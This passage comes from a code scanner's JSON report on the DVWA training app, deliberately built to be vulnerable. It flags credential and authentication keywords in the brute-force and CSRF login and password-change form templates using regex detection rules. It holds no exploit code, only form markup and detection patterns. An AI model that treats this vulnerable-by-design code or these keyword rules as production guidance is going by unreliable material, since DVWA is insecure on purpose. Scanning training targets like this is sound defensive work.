        "excerpt": "\n\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;{$method}\\&quot;&gt;\n\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\n",
        "startLocationLine": 44,
        "startLocationColumn": 32,
        "endLocationLine": 44,
        "endLocationColumn": 40
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;{$method}\\&quot;&gt;\n\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n",
        "startLocationLine": 45,
        "startLocationColumn": 4,
        "endLocationLine": 45,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\t\t\t&quot; . tokenField();\n",
        "startLocationLine": 46,
        "startLocationColumn": 18,
        "endLocationLine": 46,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\t\t\t&quot; . tokenField();\n",
        "startLocationLine": 46,
        "startLocationColumn": 57,
        "endLocationLine": 46,
        "endLocationColumn": 65
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Username",
        "excerpt": "\t\t&lt;h2&gt;Login&lt;/h2&gt;\n\n\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;{$method}\\&quot;&gt;\n\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n",
        "startLocationLine": 43,
        "startLocationColumn": 4,
        "endLocationLine": 43,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "username",
        "excerpt": "\n\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;{$method}\\&quot;&gt;\n\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\n",
        "startLocationLine": 44,
        "startLocationColumn": 32,
        "endLocationLine": 44,
        "endLocationColumn": 40
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;{$method}\\&quot;&gt;\n\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n",
        "startLocationLine": 45,
        "startLocationColumn": 4,
        "endLocationLine": 45,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\t\t\t&quot; . tokenField();\n",
        "startLocationLine": 46,
        "startLocationColumn": 18,
        "endLocationLine": 46,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\t\t\t&quot; . tokenField();\n",
        "startLocationLine": 46,
        "startLocationColumn": 57,
        "endLocationLine": 46,
        "endLocationColumn": 65
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Cross Site Request Forgery (CSRF)&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;csrf&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;csrf&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t&lt;h1&gt;Vulnerability: Cross Site Request Forgery (CSRF)&lt;/h1&gt;\n\n\t&lt;div class=\\&quot;vulnerable_code_area\\&quot;&gt;\n\t\t&lt;h3&gt;Change your admin password:&lt;/h3&gt;\n\t\t&lt;br /&gt;\n\n\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;GET\\&quot;&gt;&quot;;\n\nif( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n",
        "startLocationLine": 39,
        "startLocationColumn": 25,
        "endLocationLine": 39,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\nif( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n\t$page[ &#39;body&#39; ] .= &quot;\n\t\t\tCurrent password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_current\\&quot;&gt;&lt;br /&gt;&quot;;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\n\t\t\tNew password:&lt;br /&gt;\n",
        "startLocationLine": 46,
        "startLocationColumn": 12,
        "endLocationLine": 46,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "if( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n\t$page[ &#39;body&#39; ] .= &quot;\n\t\t\tCurrent password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_current\\&quot;&gt;&lt;br /&gt;&quot;;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\n\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n",
        "startLocationLine": 47,
        "startLocationColumn": 18,
        "endLocationLine": 47,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "}\n\n$page[ &#39;body&#39; ] .= &quot;\n\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Change\\&quot; name=\\&quot;Change\\&quot;&gt;\\n&quot;;\n",
        "startLocationLine": 51,
        "startLocationColumn": 8,
        "endLocationLine": 51,
        "endLocationColumn": 16
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\n$page[ &#39;body&#39; ] .= &quot;\n\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Change\\&quot; name=\\&quot;Change\\&quot;&gt;\\n&quot;;\n\n",
        "startLocationLine": 52,
        "startLocationColumn": 18,
        "endLocationLine": 52,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "$page[ &#39;body&#39; ] .= &quot;\n\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Change\\&quot; name=\\&quot;Change\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n",
        "startLocationLine": 53,
        "startLocationColumn": 16,
        "endLocationLine": 53,
        "endLocationColumn": 24
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Change\\&quot; name=\\&quot;Change\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\t\t\t&quot; . tokenField();\n",
        "startLocationLine": 54,
        "startLocationColumn": 18,
        "endLocationLine": 54,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t&lt;h1&gt;Vulnerability: Cross Site Request Forgery (CSRF)&lt;/h1&gt;\n\n\t&lt;div class=\\&quot;vulnerable_code_area\\&quot;&gt;\n\t\t&lt;h3&gt;Change your admin password:&lt;/h3&gt;\n\t\t&lt;br /&gt;\n\n\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;GET\\&quot;&gt;&quot;;\n\nif( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n",
        "startLocationLine": 39,
        "startLocationColumn": 25,
        "endLocationLine": 39,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\nif( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n\t$page[ &#39;body&#39; ] .= &quot;\n\t\t\tCurrent password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_current\\&quot;&gt;&lt;br /&gt;&quot;;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\n\t\t\tNew password:&lt;br /&gt;\n",
        "startLocationLine": 46,
        "startLocationColumn": 12,
        "endLocationLine": 46,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "if( $vulnerabilityFile == &#39;impossible.php&#39; ) {\n\t$page[ &#39;body&#39; ] .= &quot;\n\t\t\tCurrent password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_current\\&quot;&gt;&lt;br /&gt;&quot;;\n}\n\n$page[ &#39;body&#39; ] .= &quot;\n\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n",
        "startLocationLine": 47,
        "startLocationColumn": 18,
        "endLocationLine": 47,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "}\n\n$page[ &#39;body&#39; ] .= &quot;\n\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Change\\&quot; name=\\&quot;Change\\&quot;&gt;\\n&quot;;\n",
        "startLocationLine": 51,
        "startLocationColumn": 8,
        "endLocationLine": 51,
        "endLocationColumn": 16
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\n$page[ &#39;body&#39; ] .= &quot;\n\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Change\\&quot; name=\\&quot;Change\\&quot;&gt;\\n&quot;;\n\n",
        "startLocationLine": 52,
        "startLocationColumn": 18,
        "endLocationLine": 52,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "$page[ &#39;body&#39; ] .= &quot;\n\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Change\\&quot; name=\\&quot;Change\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n",
        "startLocationLine": 53,
        "startLocationColumn": 16,
        "endLocationLine": 53,
        "endLocationColumn": 24
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
